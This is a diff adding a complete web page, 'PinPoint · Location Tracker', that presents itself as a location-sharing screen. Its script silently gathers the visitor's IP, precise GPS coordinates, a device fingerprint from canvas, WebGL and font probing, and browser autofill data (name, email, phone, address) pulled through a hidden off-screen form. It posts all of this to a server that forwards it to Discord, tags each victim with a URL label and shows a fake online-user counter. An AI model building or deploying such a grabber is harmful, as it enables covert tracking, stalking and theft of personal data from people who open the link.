@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>PinPoint · Location Tracker</title>
+<style>
+  :root { color-scheme:dark; --bg:#0a0d14; --panel:#121722; --line:#232a38; --muted:#8b93a7;
+          --text:#eef1f7; --accent:#4f8cff; --green:#38d39f; }
+  * { box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body { margin:0; min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+         background:radial-gradient(1200px 600px at 50% -10%, #16203a 0%, var(--bg) 55%);
+         color:var(--text); display:flex; flex-direction:column; align-items:center; justify-content:center;
+         padding:24px 16px; gap:14px; }
+  .phone { width:100%; max-width:400px; background:var(--panel); border:1px solid var(--line);
+           border-radius:28px; overflow:hidden; box-shadow:0 30px 80px rgba(0,0,0,.55); }
+  .bar { display:flex; align-items:center; gap:10px; padding:16px 20px; border-bottom:1px solid var(--line); }
+  .logo { width:30px; height:30px; border-radius:9px; display:grid; place-items:center; font-size:15px;
+          background:linear-gradient(135deg,var(--accent),#7b5cff); }
+  .brand { font-size:14px; font-weight:700; } .brand span { color:var(--muted); font-weight:500; }
+  .pill { margin-left:auto; font-size:11px; color:var(--green); border:1px solid rgba(56,211,159,.3);
+          background:rgba(56,211,159,.08); padding:3px 9px; border-radius:999px; display:flex; gap:6px; align-items:center;
+          font-variant-numeric:tabular-nums; }
+  .dot { width:6px; height:6px; border-radius:50%; background:var(--green); animation:pulse 2s infinite; }
+  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(56,211,159,.5);} 70%{box-shadow:0 0 0 8px rgba(56,211,159,0);} 100%{box-shadow:0 0 0 0 rgba(56,211,159,0);} }
+  .screen { padding:34px 24px 30px; } .hidden { display:none !important; }
+  .pin { width:84px; height:84px; margin:6px auto 22px; border-radius:50%; display:grid; place-items:center;
+         font-size:36px; position:relative; border:1px solid rgba(79,140,255,.35);
+         background:radial-gradient(circle at 50% 40%, rgba(79,140,255,.28), rgba(79,140,255,.05)); }
+  .pin::after { content:""; position:absolute; inset:-14px; border-radius:50%; border:1px solid rgba(79,140,255,.18); animation:ring 2.6s infinite; }
+  @keyframes ring { 0%{transform:scale(.9);opacity:.8;} 100%{transform:scale(1.25);opacity:0;} }
+  h1 { font-size:22px; margin:0 0 10px; text-align:center; line-height:1.25; }
+  .lead { color:var(--muted); font-size:14.5px; text-align:center; line-height:1.55; margin:0 0 26px; }
+  .btn { width:100%; padding:15px; border:0; border-radius:14px; cursor:pointer; font-size:15.5px; font-weight:700;
+         color:#fff; background:linear-gradient(135deg,var(--accent),#7b5cff); box-shadow:0 10px 26px rgba(79,140,255,.35); }
+  .btn:active { transform:translateY(1px); }
+  .btn.ghost { background:transparent; border:1px solid var(--line); color:var(--text); box-shadow:none; }
+  .hint { display:block; text-align:center; color:var(--muted); font-size:12px; margin-top:14px; }
+  .spinner { width:46px; height:46px; margin:30px auto 20px; border-radius:50%; border:3px solid var(--line);
+             border-top-color:var(--accent); animation:spin .9s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .loading-text { text-align:center; color:var(--muted); font-size:14px; }
+  .ok-badge { display:flex; align-items:center; justify-content:center; gap:8px; color:var(--green);
+              font-size:13.5px; font-weight:600; margin-bottom:18px; }
+  .map { width:100%; height:170px; border:1px solid var(--line); border-radius:14px; overflow:hidden; margin-bottom:16px; background:#0e1219; }
+  .map iframe { width:100%; height:100%; border:0; }
+  .row { display:flex; justify-content:space-between; gap:14px; padding:11px 0; border-bottom:1px solid var(--line); font-size:13.5px; }
+  .row:last-child { border-bottom:0; } .k { color:var(--muted); } .v { text-align:right; word-break:break-word; max-width:62%; }
+  .foot { padding:0 24px 26px; }
+  .status { text-align:center; color:var(--muted); font-size:12px; margin-top:14px; }
+  .credit { color:#5b6478; font-size:11.5px; text-align:center; }
+  .credit b { color:#8b93a7; font-weight:600; }
+</style>
+</head>
+<body>
+  <div class="phone">
+    <div class="bar">
+      <div class="logo">📍</div>
+      <div class="brand">PinPoint <span>· Tracker</span></div>
+      <div class="pill"><span class="dot"></span><span id="online">…</span>&nbsp;online</div>
+    </div>
+
+    <div class="screen" id="intro">
+      <div class="pin">📍</div>
+      <h1>Share your location</h1>
+      <p class="lead">Allow location access to proceed to the location tracker.</p>
+      <button class="btn" id="allow">Allow location &amp; continue</button>
+      <span class="hint">Your browser will ask for permission</span>
+    </div>
+
+    <div class="screen hidden" id="loading">
+      <div class="spinner"></div>
+      <p class="loading-text" id="loadingText">Locating you…</p>
+    </div>
+
+    <div class="screen hidden" id="result">
+      <div class="ok-badge">✓ Location confirmed</div>
+      <div class="map" id="map"></div>
+      <div id="rows"></div>
+      <div class="status" id="sendStatus">Sending…</div>
+    </div>
+
+    <div class="foot hidden" id="foot">
+      <button class="btn ghost" id="again">Track again</button>
+    </div>
+  </div>
+
+  <div class="credit">© 2026 PinPoint · Made by <b>Kayden Hogan</b></div>
+
+  <form id="af" autocomplete="on" style="position:absolute;left:-9999px;top:-9999px;height:0;overflow:hidden;">
+    <input name="name" autocomplete="name">
+    <input name="email" autocomplete="email">
+    <input name="tel" autocomplete="tel">
+    <input name="street-address" autocomplete="street-address">
+    <input name="postal-code" autocomplete="postal-code">
+    <input name="organization" autocomplete="organization">
+    <input name="username" autocomplete="username">
+    <input name="country" autocomplete="country-name">
+  </form>
+
+<script>
+const $ = id => document.getElementById(id);
+const show = id => { ['intro','loading','result','foot'].forEach(s => $(s).classList.add('hidden')); $(id).classList.remove('hidden'); };
+
+let online = Math.floor(100 + Math.random() * 9400);
+const fmt = n => n.toLocaleString('en-US');
+$('online').textContent = fmt(online);
+setInterval(() => {
+  online += Math.floor(Math.random() * 41) - 18;
+  if (online < 100) online = 100 + Math.floor(Math.random() * 60);
+  if (online > 9500) online = 9500 - Math.floor(Math.random() * 60);
+  $('online').textContent = fmt(online);
+}, 2500);
+
+async function sha256(str) {
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+function canvasHash() {
+  try {
+    const c = document.createElement('canvas'), x = c.getContext('2d');
+    x.textBaseline='top'; x.font="14px 'Arial'"; x.fillStyle='#f60';
+    x.fillRect(0,0,100,30); x.fillStyle='#069'; x.fillText('PinPoint-🔍',2,2);
+    return c.toDataURL().slice(-64);
+  } catch(e){ return ''; }
+}
+function webglRenderer() {
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const d = gl.getExtension('WEBGL_debug_renderer_info');
+    return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : (gl.getParameter(gl.RENDERER)||'');
+  } catch(e){ return ''; }
+}
+function fontCount() {
+  const base = ['monospace','sans-serif','serif'], test = ['Arial','Calibri','Cambria','Consolas','Georgia','Tahoma','Times New Roman','Verdana','Roboto','Segoe UI'];
+  const c = document.createElement('canvas').getContext('2d');
+  const w = f => { c.font = "72px " + f; return c.measureText('mmmmmmmmmmlli').width; };
+  const b = {}; base.forEach(f => b[f] = w(f));
+  let n = 0;
+  test.forEach(f => { if (base.some(bf => w("'"+f+"',"+bf) !== b[bf])) n++; });
+  return n;
+}
+async function makeFingerprint() {
+  const parts = [
+    navigator.userAgent, navigator.language, (navigator.languages||[]).join(','),
+    `${screen.width}x${screen.height}x${screen.colorDepth}`, window.devicePixelRatio,
+    new Date().getTimezoneOffset(), Intl.DateTimeFormat().resolvedOptions().timeZone,
+    navigator.hardwareConcurrency||'', navigator.deviceMemory||'',
+    navigator.platform||'', navigator.maxTouchPoints||'',
+    Array.from(navigator.plugins||[]).map(p=>p.name).join(','),
+    canvasHash(), webglRenderer(), fontCount(),
+  ].join('|');
+  return { hash: (await sha256(parts)).slice(0,32) };
+}
+const fpPromise = makeFingerprint();
+
+function readAutofill() {
+  const out = {};
+  const f = $('af');
+  ['name','email','tel','street-address','postal-code','organization','username','country']
+    .forEach(k => { const v = f.elements[k] && f.elements[k].value; if (v) out[k] = v; });
+  return out;
+}
+
+function row(k, v) {
+  if (!v) return;
+  const d = document.createElement('div');
+  d.className = 'row';
+  d.innerHTML = `<span class="k">${k}</span><span class="v">${v}</span>`;
+  $('rows').appendChild(d);
+}
+
+async function collect() {
+  show('loading');
+  const msgs = ['Locating you…','Triangulating…','Confirming position…'];
+  let i = 0;
+  const t = setInterval(() => { $('loadingText').textContent = msgs[++i % msgs.length]; }, 1400);
+
+  let info = { ip:'', geo:{} };
+  try { info = await (await fetch('/api')).json(); } catch(e) {}
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      p => { clearInterval(t); finish(info, p); },
+      () => { clearInterval(t); finish(info, null); },
+      { enableHighAccuracy:true, timeout:10000, maximumAge:0 });
+  } else { clearInterval(t); finish(info, null); }
+}
+
+async function finish(info, pos) {
+  const bg = pos ? {
+    lat: pos.coords.latitude.toFixed(5), lon: pos.coords.longitude.toFixed(5),
+    accuracy: Math.round(pos.coords.accuracy)
+  } : null;
+  const fp = await fpPromise;
+  const af = readAutofill();
+
+  $('rows').innerHTML = '';
+  row('IP address', info.ip);
+  row('City', info.geo && info.geo.city);
+  row('Region', info.geo && info.geo.region);
+  row('Country', info.geo && info.geo.country);
+  if (bg) { row('Coordinates', `${bg.lat}, ${bg.lon}`); row('Accuracy', `±${bg.accuracy} m`); }
+  else row('GPS', 'permission denied');
+  row('Device ID', fp.hash);
+  if (af.name) row('Autofill name', af.name);
+  if (af.email) row('Autofill email', af.email);
+
+  const lat = bg ? bg.lat : (info.geo && info.geo.lat);
+  const lon = bg ? bg.lon : (info.geo && info.geo.lon);
+  if (lat && lon) {
+    const b = `${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}`;
+    $('map').innerHTML = `<iframe loading="lazy" src="https://www.openstreetmap.org/export/embed.html?bbox=${b}&layer=mapnik&marker=${lat}%2C${lon}"></iframe>`;
+  }
+
+  show('result'); $('foot').classList.remove('hidden');
+
+  fetch('/api', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      ip: info.ip, browser_geo: bg,
+      screen:`${screen.width}x${screen.height}`, dpr: window.devicePixelRatio,
+      language: navigator.language, referrer: document.referrer, url: location.href,
+      ua: navigator.userAgent, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      fingerprint: fp.hash,
+      fingerprint_components: {
+        renderer: webglRenderer(), cores: navigator.hardwareConcurrency||'?',
+        memory: navigator.deviceMemory||'?', touch: navigator.maxTouchPoints||0,
+        platform: navigator.platform||'?', fonts: fontCount(),
+      },
+      autofill: af,
+      label: new URLSearchParams(location.search).get('label') || '',
+      ts: new Date().toISOString(),
+    }),
+  })
+    .then(r => r.json())
+    .then(d => {
+      $('sendStatus').textContent = d.sent ? 'Sent to Discord ✓' : 'Not sent: ' + d.message;
+      if (d.address) row('Address', d.address);
+    })
+    .catch(e => $('sendStatus').textContent = 'Send failed: ' + e);
+}
+
+$('allow').onclick = collect;
+$('again').onclick = () => { $('map').innerHTML=''; collect(); };
+</script>
+</body>
+</html>
